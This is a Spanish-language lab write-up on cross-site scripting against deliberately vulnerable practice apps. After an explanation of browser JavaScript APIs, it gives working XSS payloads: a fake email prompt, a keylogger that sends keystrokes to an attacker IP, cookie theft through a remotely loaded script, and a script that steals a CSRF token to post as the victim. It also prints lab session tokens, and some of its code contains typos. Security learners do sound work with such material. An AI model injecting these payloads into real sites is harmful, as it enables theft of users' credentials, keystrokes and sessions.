---
title: "[Lab] Cross-Site Scripting (XSS)"
date: 2023-12-25
categories: [OWASPTop10]
tags: [owasptop10, hacking, javascript]
---


# Cross-Site Scripting (XSS)


## Instalación

Máquina MyExpense: [https://www.vulnhub.com/entry/myexpense-1,405/](https://www.vulnhub.com/entry/myexpense-1,405/)

```bash
git clone https://github.com/globocom/secDevLabs
cd secDevLabs/owasp-top10-2021-apps/a3/gossip-world
make install
```

Una vez instalado, se verifica el puerto por el cual se monta la página web y crear dos usuarios:

![Untitled](Cross-Site%20Scripting%20(XSS)%20%5B1%202%5D%20y%20%5B2%202%5D%208d452909a3a648bb975b8da51251c41c/Untitled.png)

## Script explicado

**prompt(””)** = Sirve para mostrar un cuadro de diálogo con un mensaje que solicita al usuario que ingrese algún texto o información. eje: 

```bash
<script>
	prompt(”Por favor, ingrese un texto”, "ejemplodetexto")

# El primer "" indica el encabezado o el mensaje para indicarle 
# al usuario qué ingresar y el segundo "" es como un placeholder o 
# texto de ejemplo que aparece dentro del formulario.
</script>
```

**Verificar si la variable “email” está vacía:**

```bash
	if (email == null || email == ""){
		alert("Está vacía");
	} else {
		alert("No está vacía");
	}
```

Esto lo que hará es verificar si la variable email está vacía comparándola con null y luego la compara con una cadena vacía.

**fetch() =** Proporciona una interfaz JavaScript para acceder y manipular partes del canal HTTP, tales como peticiones y respuestas, eje:

```bash
fetch("http://localhost/");
```

**document.onkeypress =** Es un evento de javascript, este evento es ejecutado cuando presionamos cualquier tecla que produce un caracter.

**image() =** es una línea de código que determina un elemento img en caso de que el modelo de datos no tenga este elemento o el usuario haya decidido no crearlo.

**e.key** = Es una propiedad estándar del objeto **`KeyboardEvent`**, que es el objeto de evento proporcionado por el navegador cuando se produce un evento de teclado.

La propiedad **`e.key`** representa el valor de la tecla que se ha presionado durante el evento de teclado. Este valor puede ser una cadena que representa la tecla en sí, como "A", "Enter", "Backspace", etc., o puede ser un valor específico para teclas especiales, como "ArrowUp", "Shift", "Control", etc.

La propiedad **`key`** es parte de la especificación de eventos de teclado y está bien soportada en la mayoría de los navegadores modernos.

Aquí puedes encontrar más información sobre la propiedad **`key`** y otros miembros del objeto **`KeyboardEvent`**: **[KeyboardEvent - Web APIs | MDN](https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent)**

**window.location.href = “URL_to_redirect”;** = La variable window.location es un método JavaScript utilizado para redirigir el navegador a una nueva página.

**XMLHttpRequest** = Es un objeto nativo del navegador que permite hacer solicitudes HTTP desde JavaScript. Más info: [https://es.javascript.info/xmlhttprequest](https://es.javascript.info/xmlhttprequest)

- **send() y open()**
    1. **`open(method, url, async)`**: El método **`open()`** se utiliza para configurar la solicitud antes de enviarla. Toma tres parámetros:
        - **`method`**: Especifica el método HTTP a utilizar en la solicitud, como "GET", "POST", "PUT", etc.
        - **`url`**: Especifica la URL a la que se enviará la solicitud.
        - **`async`**: Especifica si la solicitud debe ser síncrona (**`false`**) o asíncrona (**`true`**). Como se mencionó anteriormente, se recomienda utilizar solicitudes asíncronas para mantener la capacidad de respuesta de la página.
    2. **`send(data)`**: El método **`send()`** se utiliza para enviar la solicitud al servidor. Puede tomar un parámetro opcional **`data`**, que representa los datos que se enviarán en la solicitud (por ejemplo, datos de formulario o datos JSON). El formato y contenido de **`data`** dependen del tipo de solicitud y de lo que el servidor espera recibir.
    
    Por ejemplo, aquí hay un ejemplo básico que utiliza **`open()`** y **`send()`** para realizar una solicitud GET asíncrona:
    
    ```bash
    var req = new XMLHttpRequest();
    req.open('GET', 'http://api.example.com/data', true);
    req.send();
    ```
    
    En este caso, se crea un nuevo objeto **`XMLHttpRequest`**, se llama al método **`open()`** para configurar la solicitud GET hacia la URL **`'http://api.example.com/data'`**, y finalmente se llama al método **`send()`** para enviar la solicitud al servidor.
    
    Es importante tener en cuenta que después de llamar al método **`send()`**, es posible que desees configurar un controlador de eventos para manejar la respuesta del servidor. Esto se hace mediante la escucha de eventos como **`onload`**, **`onerror`**, **`onreadystatechange`**, etc., y ejecutando el código correspondiente cuando se dispare el evento.
    

**Petición síncrona y asíncrona**: Una solicitud síncrona bloquea la ejecución del código hasta que se complete la solicitud y se reciba la respuesta del servidor. Esto significa que el resto del código se detiene y no continúa su ejecución hasta que se haya realizado la solicitud y se haya obtenido la respuesta del servidor. Las solicitudes síncronas pueden hacer que la interfaz de usuario se bloquee, lo que puede afectar la capacidad de respuesta de la página o la aplicación.

Por otro lado, una solicitud asíncrona no bloquea la ejecución del código. El código continúa ejecutándose mientras se realiza la solicitud al servidor y se espera la respuesta. Cuando se recibe la respuesta, se activa un evento y se ejecuta el código asociado a ese evento.

**<script src=”http://<IP>/file.js”></script>** = Esto hará que el usuario cargue un recurso de la dirección dada.

**responseText()** = Esto devuelve un DOMString que contiene la respuesta a la consulta como un texto o null si la consulta no tuvo exito o aun no ha sido completada. la propiedad responseText tendra una respuesta parcial como retorno aunque la consulta no haya sido completada.

**DOMString** = Se usa para almacenar caracteres [ Unicode ] como una secuencia de unidades de 16-bit usando UTF-16

**btoa()** = Sirve para transformar una petición HTTP a base64

- **DOMParser(), parseFromString() y getElementsByName()**
    1. **`DOMParser()`**:
        - El objeto **`DOMParser`** es una interfaz del DOM (Document Object Model) que permite analizar una cadena de texto XML o HTML y crear un nuevo documento **`Document`** a partir de ella.
        - Puedes crear una instancia de **`DOMParser`** llamando al constructor **`DOMParser()`** sin parámetros.
    2. **`parseFromString()`**:
        - **`parseFromString()`** es un método del objeto **`DOMParser`** que toma una cadena de texto XML o HTML como entrada y devuelve un nuevo documento **`Document`**.
        - Se utiliza para analizar y convertir una cadena de texto en un documento XML o HTML.
        - Toma dos parámetros:
            - El primer parámetro es la cadena de texto a analizar.
            - El segundo parámetro es el tipo de contenido, que puede ser **`'text/xml'`** para XML o **`'text/html'`** para HTML.
    3. **`getElementsByName()`**:
        - **`getElementsByName()`** es un método de los objetos **`Document`** y **`DocumentFragment`** en el DOM.
        - Se utiliza para obtener una colección de elementos que tienen un atributo **`name`** especificado.
        - Toma un parámetro, que es el valor del atributo **`name`** que se utiliza para buscar los elementos.
        - Devuelve una colección de elementos que coinciden con el atributo **`name`**. La colección se puede acceder utilizando un índice numérico o mediante un bucle.

- **withCredentials**
    
    La propiedad **`withCredentials`** se utiliza en las solicitudes AJAX para indicar si se deben incluir las cookies y las credenciales de autenticación en la solicitud. Cuando se establece en **`true`**, indica que las solicitudes deben ser enviadas con credenciales, como cookies de sesión, autenticación HTTP básica o certificados de cliente.
    
    Al establecer **`withCredentials`** en **`true`**, la solicitud AJAX puede enviar y recibir cookies y otros datos de autenticación necesarios para realizar una autenticación o una sesión de usuario continua en el servidor.
    
    Es importante tener en cuenta que para que **`withCredentials`** funcione correctamente, tanto el servidor que recibe la solicitud como el servidor que envía la respuesta deben estar configurados para permitir y manejar las credenciales. Esto puede implicar configurar encabezados de respuesta adecuados en el servidor y permitir solicitudes de origen cruzado (CORS) si el dominio del servidor y el dominio de la página que realiza la solicitud son diferentes.
    
    Aquí hay un ejemplo de cómo se puede utilizar **`withCredentials`** en una solicitud AJAX con **`XMLHttpRequest`**:
    
    ```bash
    var xhr = new XMLHttpRequest();
    xhr.withCredentials = true;
    xhr.open('GET', 'https://api.example.com/data', true);
    xhr.send();
    ```
    
    En este ejemplo, **`xhr.withCredentials = true`** se establece antes de llamar al método **`open()`** para indicar que las credenciales deben incluirse en la solicitud. Luego, se envía una solicitud GET a **`'https://api.example.com/data'`**. Si el servidor permite y está configurado para manejar credenciales, las cookies y otras credenciales asociadas se enviarán con la solicitud.
    

- **setRequestHeader**
    
    La función **`setRequestHeader()`** se utiliza en las solicitudes AJAX para establecer un encabezado personalizado en la solicitud antes de enviarla al servidor. Permite agregar información adicional a la solicitud, como encabezados de autorización, encabezados personalizados, tipos de contenido, etc.
    
    El método **`setRequestHeader()`** se llama en una instancia del objeto **`XMLHttpRequest`** (o en una biblioteca que lo utilice) y toma dos parámetros:
    
    1. **`header`**: Es una cadena que especifica el nombre del encabezado que se va a establecer.
    2. **`value`**: Es una cadena que representa el valor del encabezado que se va a establecer.
    
    Aquí tienes un ejemplo de cómo se utiliza **`setRequestHeader()`** para establecer el encabezado **`Authorization`** con un token de acceso:
    
    ```
    javascriptCopy code
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://api.example.com/data', true);
    xhr.setRequestHeader('Authorization', 'Bearer myAccessToken');
    xhr.send();
    
    ```
    
    En este ejemplo, **`setRequestHeader()`** se utiliza para agregar un encabezado de autorización a la solicitud. El encabezado **`Authorization`** se establece con el valor **`'Bearer myAccessToken'`**, donde **`myAccessToken`** es el token de acceso válido.
    
    Es importante tener en cuenta que algunos encabezados, como **`Content-Type`** o **`Accept`**, tienen métodos específicos para establecerlos, como **`setRequestHeader('Content-Type', 'application/json')`**. Además, es posible que algunos encabezados estén restringidos debido a las políticas de seguridad del navegador o el servidor, por lo que no se permitirá establecerlos o se eliminarán automáticamente.
    
    Recuerda consultar la documentación del servidor o la API que estás utilizando para determinar qué encabezados son necesarios y cómo deben configurarse.
    

## Scripts para XSS

### HTML

```bash
Esto es una <h1>prueba</h1>
<marquee>Prueba</marquee>
```

![Untitled](Cross-Site%20Scripting%20(XSS)%20%5B1%202%5D%20y%20%5B2%202%5D%208d452909a3a648bb975b8da51251c41c/Untitled%201.png)

![Untitled](Cross-Site%20Scripting%20(XSS)%20%5B1%202%5D%20y%20%5B2%202%5D%208d452909a3a648bb975b8da51251c41c/Untitled%202.png)

### JavaScript: Mostrando alerta en pantalla

```bash
# Mostrar una alerta en la pantalla
<script>alet("XSS")</script>
```

Si esto funciona, significa que la web es vulnerable a XSS.

### JavaScript: Phishing para correos

Mediante una alerta mostrada en pantalla, se le pedirá al usuario ingresar credenciales para continuar visitando el sitio.

Primero se crea un archivo el cual servirá para hacer el código el cual luego se copiará y pegará en el campo vulnerable a XSS en la web:

```bash
nano phishing.js
```

Código

```bash
<script>
	var email = prompt("Por favor introduce tu correo electrónico 
	para continuar", "example@gmail.com");

	if (email == null || email == ""){
		alert("Por favor, ingresa un usuario válido");
	} else {
		fetch("http://localhost/?email=" + email);
	}
</script>
```

- Alternativa (No funciona correctamente)
    
    ```bash
    <div id="formContainer"></div>
    
    <script>
    	var email;
    	var password;
    	var form = '<form>'+
    		'Email:<input type="email" id="email" required>'+
    		' Contraseña:<input type="password" id="password" required>'+
    		'<input type="buttom" onclick="submitForm()" value="Submit">'+
    		'</form>';
    	
    	document.getElementByld("formContainer").innerHTML = form;
    
    	function submitForm(){
    		email = document.getElementByld("email").value;
    		password = document.getElementByld("password").value;
    		fetch("http://localhost/?email=" + email + "&password=" + password);
    	}
    </script>
    ```
    

Primero se le pedirá al usuario que ingrese un correo, luego se verificará si el usuario ingresó contenido y en caso afirmativo, se hará una petición a la dirección del atacante por el puerto 80 concatenándole la variable “email”, la cual contiene el correo ingresado.

![Untitled](Cross-Site%20Scripting%20(XSS)%20%5B1%202%5D%20y%20%5B2%202%5D%208d452909a3a648bb975b8da51251c41c/Untitled%203.png)

![Untitled](Cross-Site%20Scripting%20(XSS)%20%5B1%202%5D%20y%20%5B2%202%5D%208d452909a3a648bb975b8da51251c41c/Untitled%204.png)

### JavaScript: KeyLogger

Se capturarán todas las pulsaciones de teclas que el usuario haga dentro de la web:

```bash
<script>
	var k = "";
	document.onkeypress = function(e){
	e = e || window.event;
	k += e.key
	var i = new Image();
	i.src = "http://192.168.0.110/" + k;
	};
</script>
```

- Explicación alternativa
    
    La variable “k” almacenará todos los caracteres que el usuario presione. “document.onkeypress” es un evento de javascript, este evento es ejecutado cuando presionamos cualquier tecla que produce un caractér, este almacenará una función a la cual se le pasará el argumento el cual será para referirse al key que haya presionado en usuario mediante el atributo “e.key”. Dentro de la función se especifica que “k” irá agregando “e.key” el cual sirve para capturar la tecla presionada por el usuario. Luego con la función “Image()”, hará que el usuario cargue una imagen y que cargue la imagen de la dirección especificada en “i.src” la cual corresponde a la dirección del atacante concatenándole la key puesta por el usuario.
    

Explicación:

1. **`var k = "";`**: Declara una variable **`k`** e inicializa su valor como una cadena vacía. Esta variable se utilizará para almacenar las teclas presionadas por el usuario.
2. **`document.onkeypress = function(e){`**: Establece un controlador de eventos para el evento **`onkeypress`** del documento. Esto significa que cada vez que se presione una tecla en el documento, se ejecutará la función anónima definida a continuación.
3. **`e = e || window.event;`**: Asigna el objeto del evento a la variable **`e`**. Esto se hace para garantizar la compatibilidad con diferentes navegadores, ya que algunos navegadores pueden usar **`window.event`** en lugar de pasar el evento como un parámetro.
4. **`k += e.key`**: Agrega la tecla presionada a la variable **`k`**. La propiedad **`e.key`** contiene el valor de la tecla presionada.
5. **`var i = new Image();`**: Crea un nuevo objeto de imagen en JavaScript. Se utiliza para cargar una imagen desde una URL.
6. **`i.src = "http://192.168.0.110/" + k;`**: Establece la propiedad **`src`** de la imagen **`i`** para cargar una imagen desde la URL especificada. En este caso, la URL es "**http://192.168.0.110/**" concatenada con el contenido de la variable **`k`**, que contiene la cadena de teclas presionadas por el usuario.

![Captura del usuario víctima escribiendo cualquier cosa](Cross-Site%20Scripting%20(XSS)%20%5B1%202%5D%20y%20%5B2%202%5D%208d452909a3a648bb975b8da51251c41c/Untitled%205.png)

Captura del usuario víctima escribiendo cualquier cosa

![Captura del atacante capturando todas pulsaciones que hace el usuario](Cross-Site%20Scripting%20(XSS)%20%5B1%202%5D%20y%20%5B2%202%5D%208d452909a3a648bb975b8da51251c41c/Untitled%206.png)

Captura del atacante capturando todas pulsaciones que hace el usuario

![Untitled](Cross-Site%20Scripting%20(XSS)%20%5B1%202%5D%20y%20%5B2%202%5D%208d452909a3a648bb975b8da51251c41c/Untitled%207.png)

### JavaScript: Redirecciones

Se hará un redireccionamiento al usuario hacia una URL especificada

```bash
<script>
window.location.href = "<URL_to_redirect>";
</script>
```

### JavaScript: Cookie Hijacking [1/2]

Se robará la cookie de sesión del usuario víctima

Con “ctrl + c” se puede ver la cookie de sesión actual del usuario:

![Untitled](Cross-Site%20Scripting%20(XSS)%20%5B1%202%5D%20y%20%5B2%202%5D%208d452909a3a648bb975b8da51251c41c/Untitled%208.png)

cookie:

```bash
# Cookie del usuario Bryan
eyJfY3NyZl90b2tlbiI6ImEzOTM3MjdiLTAzODYtNDBlNS1hZDc5LTEwN2ZhM2YxYTJjNCIsInVzZXJuYW1lIjoiYnJ5YW4ifQ.ZJCZOQ.UUsXi6L-BjqgxL0BZ8tkrEPPZxI

# Cookie del usuario Kim
eyJfY3NyZl90b2tlbiI6ImQ0MmM4NmFmLTg1OGQtNDA2Ny1iNGIyLWMzOTY2OTZlMmRjZiIsInVzZXJuYW1lIjoiS2ltIn0.ZJB-Mg.u9z9UjtLLT1ol_YT7rgnnPG42tM
```

Por su estructura, se puede saber que corresponde a un “JSON Web Token” o JWT. Y se puede ver su contenido si se ingresa en la página: [https://jwt.io/](https://jwt.io/)

![Untitled](Cross-Site%20Scripting%20(XSS)%20%5B1%202%5D%20y%20%5B2%202%5D%208d452909a3a648bb975b8da51251c41c/Untitled%209.png)

- ¿Qué es un JWT?
    
    JSON Web Token (JWT) es un estándar abierto (RFC-7519) basado en JSON para crear un token que sirva para enviar datos entre aplicaciones o servicios y garantizar que sean válidos y seguros. El caso más común de uso de los JWT es **para manejar la autenticación en aplicaciones móviles o web**.
    

**HTTPOnly**

- ¿Qué es HTTPOnly?
    
    El atributo HttpOnly es un **atributo de navegador creado para impedir que las aplicaciones del lado del cliente** (como los scripts Java™ ) accedan a cookies para evitar algunas vulnerabilidades de scripts entre sitios.
    

Para efectuar el ataque, se debe desactivar el HTTPOnly ya que esto mitiga el ataque de cookie Hijacking.

![Untitled](Cross-Site%20Scripting%20(XSS)%20%5B1%202%5D%20y%20%5B2%202%5D%208d452909a3a648bb975b8da51251c41c/Untitled%2010.png)

Primero se creará un archivo el cual será cargado por un usuario. No hace falta poner las etiquetas <script>:

```bash
var request = new XMLHttpRequest();
request.open('GET', 'http://locahost/?cookie=' + document.cookie);
request.send();
```

Luego, en el campo vulnerable a XSS de la web, se le ingresa el siguiente código:

```bash
<script src="http://localhost/cookiehj.js"></script>
```

![Untitled](Cross-Site%20Scripting%20(XSS)%20%5B1%202%5D%20y%20%5B2%202%5D%208d452909a3a648bb975b8da51251c41c/Untitled%2011.png)

Ahora con la cookie se puede secuestrar la sesión del usuario Kim cambiando la cookie actual con del usuario capturado

![Untitled](Cross-Site%20Scripting%20(XSS)%20%5B1%202%5D%20y%20%5B2%202%5D%208d452909a3a648bb975b8da51251c41c/Untitled%2012.png)

### JavaScript: Cookie Hijacking [2/2]

Ahora se plantea robar la cookie de sesión de los usuarios para hacer un post en nombre de ellos

Primero hay que saber cómo se tramita la petición al subir un nuevo (gossip) post en la web por lo que se intercepta con burpsuite:

![Untitled](Cross-Site%20Scripting%20(XSS)%20%5B1%202%5D%20y%20%5B2%202%5D%208d452909a3a648bb975b8da51251c41c/Untitled%2013.png)

Esta es la petición que se manda al servidor al intentar subir un nuevo post, en este caso, los campos que interesan son la dirección a la que se acude por POST (/newgossip) y los campos del formulario:

![Untitled](Cross-Site%20Scripting%20(XSS)%20%5B1%202%5D%20y%20%5B2%202%5D%208d452909a3a648bb975b8da51251c41c/Untitled%2014.png)

![Untitled](Cross-Site%20Scripting%20(XSS)%20%5B1%202%5D%20y%20%5B2%202%5D%208d452909a3a648bb975b8da51251c41c/Untitled%2015.png)

Para hacer el ataque, hay que conseguir un valor de “_csrf_token” válido

- ¿Qué es un token CSRF?
    
    Un token CSRF es un valor secreto único e impredecible generado por una aplicación del lado del servidor y enviado al cliente para su inclusión en las solicitudes HTTP posteriores emitidas por el cliente.
    

El valor de este token está oculto y se puede ver al ver el código fuente de la web: 

![Untitled](Cross-Site%20Scripting%20(XSS)%20%5B1%202%5D%20y%20%5B2%202%5D%208d452909a3a648bb975b8da51251c41c/Untitled%2016.png)

Código:

```bash
var domain = "http://localhost:10007/newgossip"
var req1 = new XMLHttpRequest();
req1.open('GET', domain, false);
req1.withCredentials = true;
req1.send();

var response = req1.responseText;
# OPCIONAL, esto sirve si se quiere ver la respuesta y verificar el 
# _csrf_token:
# var req2 = new XMLHttpRequest();
# req2.open('GET', 'http://localhost/?reponse=' + btoa(response));
# req2.send();
var parser = new DOMParser();
var doc = parser.parseFromString(response, 'text/html');
var token = doc.getElementsByName("_csrf_token")[0].value;

var req3 = new XMLHttpResponse();
var data = "title=burp&subtitle=HACKED&text=HACKED&_csrf_token=" + token;
req3.open('POST', domain, false);
req3.withCredentials = true;
req2.setRequestHeder('Content-Type', 'application/x-www-form-urlencoded');
req3.send(data);
```

Primero se quiere que el usuario envíe una petición al servidor al recurso “/newgossip” por lo que se utiliza la variable “req1” para enviar una solicitud síncrona ya que se requiere almacenar la petición antes de continuar con el código

Ahora se utiliza “DOMParser” para crear un nuevo documento a partir de una cadena de texto HTML almacenada en “response**”**. Luego, se utiliza “getElementsByName**”** en el documento “doc**”** para obtener una colección de elementos con el atributo “name**”** igual a **"**_csrf_token**"**. Finalmente, se accede al primer elemento de la colección “[0]**”** y se obtiene su valor mediante la propiedad “.value**”**. Esto se guarda en la variable “token**”**.

Ahora toca hacer que se envíe la petición a la web para crear un nuevo post a nombre del usuario el cual se le robó el “_csrf_token”. para esto se crea una nueva petición con “req3”, también se crea una variable “data” la cual contendrá el contenido del formulario para luego se tramitada por POST a la dirección URL de la web.

También hay que tener en cuenta que se debe especificar el Content-Type, esto se verifica en la petición interceptada:

![Untitled](Cross-Site%20Scripting%20(XSS)%20%5B1%202%5D%20y%20%5B2%202%5D%208d452909a3a648bb975b8da51251c41c/Untitled%2017.png)

*Los espacios en el formulario se deben urlencodear con “%20”. Se podría usar el siguiente comando para representar una cadena urlencodeada: **`echo “Texto con espacios” | sed ‘s/ /%20/g’`***

[OPCIONAL] Ahora se quiere mandar esa respuesta al atacante, por lo que envía otra petición en dirección a la ip del atacante el inconveniente es que es una petición HTTP, entonces cuando el atacante reciba la respuesta, verá mucha información en pantalla por lo que se utiliza la función btoa() para transformar esta petición HTTP a base64. Una vez hecho 

![Untitled](Cross-Site%20Scripting%20(XSS)%20%5B1%202%5D%20y%20%5B2%202%5D%208d452909a3a648bb975b8da51251c41c/Untitled%2018.png)

![Captura de la respuesta capturada en base64](Cross-Site%20Scripting%20(XSS)%20%5B1%202%5D%20y%20%5B2%202%5D%208d452909a3a648bb975b8da51251c41c/Untitled%2019.png)

Captura de la respuesta capturada en base64

Ahora se decodifica el base64 con el siguiente comando:

```bash
echo -n "AquiSeIngresaLaPeticionEnBase64" | base64 -d; echo
```

![Untitled](Cross-Site%20Scripting%20(XSS)%20%5B1%202%5D%20y%20%5B2%202%5D%208d452909a3a648bb975b8da51251c41c/Untitled%2020.png)

### JavaScript: Evadir Firewall

Por ejemplo el objetivo tiene el puerto 8080 abierto pero externamente no es accesible, entonces si es vulnerable a XSS, se podría tramitar una petición al localhost a sí mismo en el puerto 8080 y almacenar esa respuesta y enviarla en base64 al atacante.

